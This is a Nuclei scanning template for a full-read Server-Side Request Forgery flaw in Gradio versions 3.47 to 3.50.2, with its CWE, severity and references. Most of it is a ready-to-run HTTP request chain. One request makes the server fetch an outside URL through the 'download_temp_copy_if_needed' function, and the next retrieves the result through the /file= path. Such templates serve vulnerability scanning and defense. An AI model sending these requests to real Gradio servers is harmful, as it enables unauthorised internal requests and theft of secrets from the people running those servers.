# Nuclei Template: Gradio 3.47 - 3.50.2 - Server-Side Request Forgery
**Template ID:** gradio-ssrf
**Vulnerability Class:** Server-Side Request Forgery (SSRF)
**Severity:** High
**CWE:** CWE-918
**Source:** Nuclei Template (`gradio-ssrf.yaml`)

## Vulnerability Information & PoC

## Description
Gradio Full Read SSRF when auth is not enabled, this version should work for versions 3.47 - 3.50.2.

## Steps to reproduce / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

GET /component_server HTTP/1.1
Host: {{Hostname}}

POST /component_server HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"component_id": "{{fuzz_component_id}}", "data": "http://oast.me", "fn_name": "download_temp_copy_if_needed", "session_hash": "aaaaaaaaaaa"}

GET /file={{download_path}} HTTP/1.1
Host: {{Hostname}}
```

## References
- https://github.com/gradio-app/gradio/commit/24a583688046867ca8b8b02959c441818bdb34a2
- https://www.horizon3.ai/attack-research/disclosures/exploiting-file-read-vulnerabilities-in-gradio-to-steal-secrets-from-hugging-face-spaces/
